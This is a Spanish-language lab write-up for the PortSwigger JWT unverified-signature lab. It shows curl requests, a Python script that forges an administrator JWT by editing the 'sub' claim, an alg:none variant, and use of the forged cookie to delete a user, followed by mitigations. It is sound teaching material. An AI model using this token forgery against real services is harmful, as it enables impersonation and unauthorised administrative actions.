@@ -1,0 +1,191 @@
+---
+title: "Bypass de Autenticación JWT mediante Firma No Verificada"
+description: "Cómo explotar un servidor que no verifica las firmas JWT simplemente modificando el payload del token para suplantar al administrador y evadir la autenticación."
+labUrl: "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature"
+category: "JWT"
+date: "2025-03-18"
+portswiggerDescription: "Este lab utiliza un mecanismo basado en JWT para gestionar sesiones. Debido a fallos de implementación, el servidor no verifica la firma de ningún JWT que recibe. Para resolver el lab, modifica tu token de sesión para obtener acceso al panel de administración en /admin, luego elimina al usuario carlos. Puedes iniciar sesión en tu propia cuenta usando las siguientes credenciales: wiener:peter"
+lang: "es"
+---
+
+import CollapsiblePartial from '../../../components/CollapsiblePartial.astro';
+import PartialContainer from '../../../components/PartialContainer.astro';
+
+## Conceptos Previos Necesarios Para Resolver El Lab
+
+<PartialContainer>
+  <CollapsiblePartial partial="whats-jwt" title="Fundamentos de JWT" lang="es" />
+  <CollapsiblePartial partial="jwt-unverified-signature" title="Vulnerabilidad de Firma JWT No Verificada" lang="es" />
+</PartialContainer>
+
+## Resolución
+
+Exploremos la página de login del lab directamente e iniciemos sesión para obtener un token JWT de sesión válido:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/login"
+```
+
+La página de login tiene un formulario simple con un token CSRF:
+
+```html
+<form class=login-form method=POST action="/login">
+    <input required type="hidden" name="csrf" value="GOP5f7aWBkNGS3pTsbVMVbuGkunP162M">
+    <label>Username</label>
+    <input required type=username name="username" autofocus>
+    <label>Password</label>
+    <input required type=password name="password">
+    <button class=button type=submit> Log in </button>
+</form>
+```
+
+Iniciemos sesión con las credenciales proporcionadas:
+
+```bash
+curl -D - "https://<lab-url>.web-security-academy.net/login" -d "csrf=GOP5f7aWBkNGS3pTsbVMVbuGkunP162M&username=wiener&password=peter"
+```
+
+> **Desglose del comando**: \
+`-D -` = mostrar cabeceras de respuesta en stdout \
+`-d "csrf=...&username=wiener&password=peter"` = enviar datos POST (automáticamente establece el método a POST y Content-Type a application/x-www-form-urlencoded)
+
+Respuesta:
+
+```
+HTTP/2 302 
+location: /my-account?id=wiener
+set-cookie: session=eyJraWQiOiIyYjRmOThlNC1lMjEyLTQ3YjMtOWM0Yi1hMjM3ZDgxYTM5ZTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3Mzg2Njc1MSwic3ViIjoid2llbmVyIn0.JrwvXrQ2-Y6cTTWD7REhZgU6-qNC9enR7p3TPqmUvtILKWOHm-UJ5EEphCebaCRhP79h3dZL72xStckzlk0LFAg9yn3kpyxRfWIbUAu1BEnmXPU_L9cIOcGSuiEI8f_3AJzsV5gEC7whpn9-XweBmVMN78AbkisD1h-l91fjptBkOzq2VtzdtoZtoDCZLR78ioM61PwZsBcGBM0k4I9AE_JxR93r7EKCbOpibadT98wjo4qV2v1sJ8v139nri-cATAnH3nvDOi4nElXekL90sCEMsbYKPWa3ZBJWj-cChDcgcrQ3mPYwJajKjNXNku2EM06gLFEv59aitGWFBEZ8Rg; Secure; HttpOnly; SameSite=None
+```
+
+La cookie de sesión es un token JWT. Decodifiquémoslo para entender su estructura:
+
+```bash
+echo "eyJraWQiOiIyYjRmOThlNC1lMjEyLTQ3YjMtOWM0Yi1hMjM3ZDgxYTM5ZTkiLCJhbGciOiJSUzI1NiJ9" | base64 -d | jq .
+```
+
+> **Desglose del comando**: \
+`echo "..."` = imprimir la parte del header del JWT \
+`base64 -d` = decodificar base64 \
+`jq .` = formatear JSON
+
+Salida del header:
+
+```json
+{
+  "kid": "2b4f98e4-e212-47b3-9c4b-a237d81a39e9",
+  "alg": "RS256"
+}
+```
+
+Ahora decodifiquemos el payload:
+
+```bash
+echo "eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3Mzg2Njc1MSwic3ViIjoid2llbmVyIn0" | base64 -d | jq .
+```
+
+Salida del payload:
+
+```json
+{
+  "iss": "portswigger",
+  "exp": 1773866751,
+  "sub": "wiener"
+}
+```
+
+El JWT usa **RS256** (RSA-SHA256) para la firma, que es un algoritmo asimétrico. Sin embargo, la descripción del lab nos dice que el servidor **no verifica la firma** en absoluto. Esto significa que podemos simplemente modificar el payload sin preocuparnos por re-firmar el token. La firma será inválida, pero el servidor no la verificará.
+
+Todo lo que necesitamos hacer es:
+1. Decodificar el payload
+2. Cambiar `"sub": "wiener"` a `"sub": "administrator"`
+3. Re-codificar el payload
+4. Reemplazar la parte del payload en el JWT original
+
+Creemos un script de Python para forjar el JWT de administrador:
+
+```python
+import base64
+import json
+
+JWT = "eyJraWQiOiIyYjRmOThlNC1lMjEyLTQ3YjMtOWM0Yi1hMjM3ZDgxYTM5ZTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3Mzg2Njc1MSwic3ViIjoid2llbmVyIn0.JrwvXrQ2-Y6cTTWD7REhZgU6-qNC9enR7p3TPqmUvtILKWOHm-UJ5EEphCebaCRhP79h3dZL72xStckzlk0LFAg9yn3kpyxRfWIbUAu1BEnmXPU_L9cIOcGSuiEI8f_3AJzsV5gEC7whpn9-XweBmVMN78AbkisD1h-l91fjptBkOzq2VtzdtoZtoDCZLR78ioM61PwZsBcGBM0k4I9AE_JxR93r7EKCbOpibadT98wjo4qV2v1sJ8v139nri-cATAnH3nvDOi4nElXekL90sCEMsbYKPWa3ZBJWj-cChDcgcrQ3mPYwJajKjNXNku2EM06gLFEv59aitGWFBEZ8Rg"
+
+header, payload, signature = JWT.split('.')
+
+# Decodificar el payload
+payload_decoded = json.loads(base64.urlsafe_b64decode(payload + '=='))
+
+# Alterar el claim sub para suplantar al administrador
+payload_decoded['sub'] = 'administrator'
+
+# Re-codificar el payload (JSON compacto, sin padding)
+tampered_payload = base64.urlsafe_b64encode(
+    json.dumps(payload_decoded, separators=(',', ':')).encode()
+).decode().rstrip('=')
+
+# Construir el JWT forjado - mantener header y firma originales intactos
+forged_jwt = f"{header}.{tampered_payload}.{signature}"
+
+print(forged_jwt)
+```
+
+> **Desglose del script**: \
+> El script forja un JWT de administrador:
+> 1. **Divide** el JWT original en sus tres partes (header, payload, firma)
+> 2. **Decodifica** el payload base64url para obtener los claims JSON
+> 3. **Altera** el claim `sub` de `"wiener"` a `"administrator"`
+> 4. **Re-codifica** el payload modificado de vuelta a base64url
+> 5. **Reensambla** el JWT con el header y la firma originales. El servidor no verificará la firma de todos modos.
+
+**Salida esperada:**
+
+```
+eyJraWQiOiIyYjRmOThlNC1lMjEyLTQ3YjMtOWM0Yi1hMjM3ZDgxYTM5ZTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3Mzg2Njc1MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.JrwvXrQ2-Y6cTTWD7REhZgU6-qNC9enR7p3TPqmUvtILKWOHm-UJ5EEphCebaCRhP79h3dZL72xStckzlk0LFAg9yn3kpyxRfWIbUAu1BEnmXPU_L9cIOcGSuiEI8f_3AJzsV5gEC7whpn9-XweBmVMN78AbkisD1h-l91fjptBkOzq2VtzdtoZtoDCZLR78ioM61PwZsBcGBM0k4I9AE_JxR93r7EKCbOpibadT98wjo4qV2v1sJ8v139nri-cATAnH3nvDOi4nElXekL90sCEMsbYKPWa3ZBJWj-cChDcgcrQ3mPYwJajKjNXNku2EM06gLFEv59aitGWFBEZ8Rg
+```
+
+> **Nota**: Incluso se podria cambiar el header `alg` a `none` y dejar la firma sin poner, tipo: `header.payload.`
+
+Observa que solo la **parte central** (payload) cambió. El header y la firma permanecen idénticos al token original.
+
+Ahora accedamos al panel de administración con nuestro JWT forjado:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/admin" \
+  -b "session=eyJraWQiOiIyYjRmOThlNC1lMjEyLTQ3YjMtOWM0Yi1hMjM3ZDgxYTM5ZTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3Mzg2Njc1MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.JrwvXrQ2-Y6cTTWD7REhZgU6-qNC9enR7p3TPqmUvtILKWOHm-UJ5EEphCebaCRhP79h3dZL72xStckzlk0LFAg9yn3kpyxRfWIbUAu1BEnmXPU_L9cIOcGSuiEI8f_3AJzsV5gEC7whpn9-XweBmVMN78AbkisD1h-l91fjptBkOzq2VtzdtoZtoDCZLR78ioM61PwZsBcGBM0k4I9AE_JxR93r7EKCbOpibadT98wjo4qV2v1sJ8v139nri-cATAnH3nvDOi4nElXekL90sCEMsbYKPWa3ZBJWj-cChDcgcrQ3mPYwJajKjNXNku2EM06gLFEv59aitGWFBEZ8Rg" \
+  | grep "carlos"
+```
+
+> **Desglose del comando**: \
+`-b "session=..."` = enviar el JWT forjado como cookie de sesión \
+`grep "carlos"` = mostrar líneas que contienen "carlos"
+
+Respuesta:
+
+```html
+<span>carlos - </span>
+<a href="/admin/delete?username=carlos">Delete</a>
+```
+
+Tenemos acceso de administrador. Ahora eliminemos al usuario carlos:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/admin/delete?username=carlos" \
+  -b "session=eyJraWQiOiIyYjRmOThlNC1lMjEyLTQ3YjMtOWM0Yi1hMjM3ZDgxYTM5ZTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3Mzg2Njc1MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.JrwvXrQ2-Y6cTTWD7REhZgU6-qNC9enR7p3TPqmUvtILKWOHm-UJ5EEphCebaCRhP79h3dZL72xStckzlk0LFAg9yn3kpyxRfWIbUAu1BEnmXPU_L9cIOcGSuiEI8f_3AJzsV5gEC7whpn9-XweBmVMN78AbkisD1h-l91fjptBkOzq2VtzdtoZtoDCZLR78ioM61PwZsBcGBM0k4I9AE_JxR93r7EKCbOpibadT98wjo4qV2v1sJ8v139nri-cATAnH3nvDOi4nElXekL90sCEMsbYKPWa3ZBJWj-cChDcgcrQ3mPYwJajKjNXNku2EM06gLFEv59aitGWFBEZ8Rg"
+```
+
+La falta de verificación de firma nos permitió **alterar el payload del JWT a plena vista**, sin necesidad de trucos criptográficos. Solo un pequeño cambio a través de base64 es suficiente para darle a carlos un viaje de ida a la delete query.
+
+## Estrategias de Mitigación
+
+1. **Siempre verificar las firmas JWT**: Usa el método `verify()` de tu librería, nunca solo `decode()`. Este es el requisito de seguridad JWT más fundamental
+2. **Usar librerías JWT bien mantenidas**: Confía en librerías probadas en batalla que manejen la verificación por defecto en lugar de implementar el manejo de JWT desde cero
+3. **Aplicar validación de algoritmo**: Especifica explícitamente qué algoritmos acepta el servidor y rechaza tokens que usen algoritmos inesperados
+4. **Validar todos los claims del JWT**: Siempre verifica el emisor (`iss`), expiración (`exp`) y otros claims del lado del servidor
+5. **Implementar defensa en profundidad**: No dependas únicamente de la validación JWT. Añade validaciones de sesión del lado del servidor y controles de autorización como capas adicionales
+
+## Referencias
+
+**Claims\*** son declaraciones sobre una entidad (típicamente el usuario) y datos adicionales, como identidad (`sub`), emisor (`iss`), tiempo de expiración (`exp`) y otros metadatos. [Más información sobre JWT claims](https://datatracker.ietf.org/doc/html/rfc7519#section-4)
+
+## Recursos
+
+[JWT.io Debugger](https://jwt.io/) Esta es una herramienta interactiva para decodificar, verificar y depurar tokens JWT. También me fue útil cuando era desarrollador web.
